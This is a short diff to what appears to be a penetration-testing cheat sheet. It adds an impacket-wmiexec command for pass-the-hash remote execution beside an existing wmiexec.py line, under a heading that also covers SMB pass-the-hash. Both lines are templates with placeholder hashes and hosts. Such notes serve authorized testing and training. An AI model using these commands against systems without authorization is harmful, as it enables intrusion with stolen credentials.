@@ -4,6 +4,7 @@
 
 ```bash
 python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes <lmhash>:<ntlmhash> <user>@<rhost> cmd.exe
+impacket-wmiexec -hashes <lmhash>:<ntlmhash> user@$rhost
 ```
 
 ## pass the hash (smb; pth-smbclient)
